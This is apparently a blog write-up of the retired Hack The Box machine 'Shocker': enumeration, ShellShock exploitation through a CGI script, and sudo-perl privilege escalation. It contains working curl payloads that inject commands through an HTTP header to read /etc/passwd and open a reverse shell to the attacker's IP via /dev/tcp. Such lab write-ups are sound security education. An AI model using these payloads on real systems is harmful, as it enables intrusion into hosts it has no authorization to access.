---
title:      'Shocker'
date:       '2022-01-24'
tag:        'htb'
subtag1:    'Linux'
subtag2:    'CVE'
subtag3:    'Command Injection'
---

###### Shocker is a retired easy-ranked Linux machine on HacktheBox.


### INFORMATION GATHERING

---
##### nmap scan

![nmap scan](/images/boxes/shocker/nmap.png "nmap scan")
```bash
nmap -sC -sV -Pn -oA Shocker 10.10.10.56
```

Here we discover:
- Apache 2.4.18
- SSH (running on port 2222)

---
##### directory enumeration

![ffuf 1](/images/boxes/shocker/ffuf_1.png "ffuf 1")   
```bash
ffuf -ic -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.10.56/FUZZ/   
```
- _ffuf_ => [FFUF](https://www.kali.org/tools/ffuf/) is a powerful file/directory fuzzing tool (Fuzz Faster u Fool)
- _-ic_ => ignore the comment lines in the wordlist
- _-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt_ => the word list to use
- _-u http://10.10.10.56/FUZZ/_ => the url to fuzz. Iterate the wordlist and attempt to reach the url with the word FUZZ replaced by the index word

The scan reveals a directory on the web server called _cgi-bin_

---
##### exploit research

![searchsploit](/images/boxes/shocker/searchsploit.png "searchsploit")
```bash
searchsploit Apache 2.4.18   
```
found an exploit to target cgi-bin

my c skills are weak, so I did some googling

![research 1](/images/boxes/shocker/research_1.png "research 1")
vulnerability is called _ShellShock_

![research 2](/images/boxes/shocker/research_2.png "research 2")
[https://www.surevine.com/shellshocked-a-quick-demo-of-how-easy-it-is-to-exploit/](https://www.surevine.com/shellshocked-a-quick-demo-of-how-easy-it-is-to-exploit/)

---
##### search cgi-bin for bash scripts

![ffuf 2](/images/boxes/shocker/ffuf_2.png "ffuf 2")
```bash
ffuf -ic -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.10.56/cgi-bin/FUZZ.sh   
```

fuzzing the _cgi-bin_ directory for _.sh_ files revealed a result: _user.sh_

![confirmation](/images/boxes/shocker/confirmation.png "confirmation")
navigating to _/cgi-bin/user.sh_ confirms presence by prompting to download


### EXPLOITATION

---
##### cURL

![curl passwd](/images/boxes/shocker/curl_passwd.png "curl passwd")
```bash
curl http://10.10.10.56/cgi-bin/user.sh -H "custom:() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd"   
```

- _curl_ => [cURL](https://en.wikipedia.org/wiki/CURL) is an extremely popular library used to transfer data (needs no introduction)
- _http://10.10.10.56/cgi-bin/user.sh_ => using cURL to call the bash script
- _-H "custom:() { ignored; }; echo Content-Type: text/html; echo ;_ => pass in the headers which aren't terminated correctly
- _/bin/cat /etc/passwd"_ => cat the password file

found a user named _shelly_

---
##### user.txt

![user flag](/images/boxes/shocker/user_flag.png "user flag")

---
##### establish connection

![reverse shell 1](/images/boxes/shocker/reverse_shell_1.png "reverse shell 1")
```bash
curl http://10.10.10.56/cgi-bin/user.sh -H "custom:() { ignored; }; echo Content-Type: text/html; echo ;  /bin/sh -i >& /dev/tcp/10.10.14.19/7777 0>&1"   
```
...
- _/bin/sh -i >& /dev/tcp/10.10.14.19/7777 0>&1"_ => call bash to establish a tcp connection to us on port 7777 and pass the stdin and stdout to us

![reverse shell 2](/images/boxes/shocker/reverse_shell_2.png "reverse shell 2")
```bash
nc -nvlp 7777   
```
- _nc_ => the [netcat](https://en.wikipedia.org/wiki/Netcat) package is an extremely popular tool for working with connections (also needs to introduction)
- _-n_ => skip DNS lookups
- _-v_ => provide verbose output
- _-l_ => listen
- _-p 7777_ => use port 7777

shell access as _shelly_


### POST EXPLOITATION

##### privilege escalation

![sudo check](/images/boxes/shocker/sudo_check.png "sudo check")
```bash
sudo -l
```
_shelly_ can run [perl](https://www.perl.org/) as _sudo_

![priv esc](/images/boxes/shocker/priv_esc.png "priv esc")
[https://gtfobins.github.io/gtfobins/perl/](https://gtfobins.github.io/gtfobins/perl/)

found a _perl_ command to spawn a shell (which will subsequently be run as _sudo_)

---

##### root.txt
![root flag](/images/boxes/shocker/root_flag.png "root flag")
root flag was in the _root_ directory

### SUMMARY

---
Shocker is a fun and straight-forward Linux box and relies on a well-known (and patched into oblivion) vulnerability: ShellShock. The box required minimal fuzzing/enumeration and the privilege escalation was not complicated. This is a great easy-ranked machine. It should be noted that this machine can be rooted extremely quickly using metasploit once the vulnerability is discovered, effectively trivializing this box.
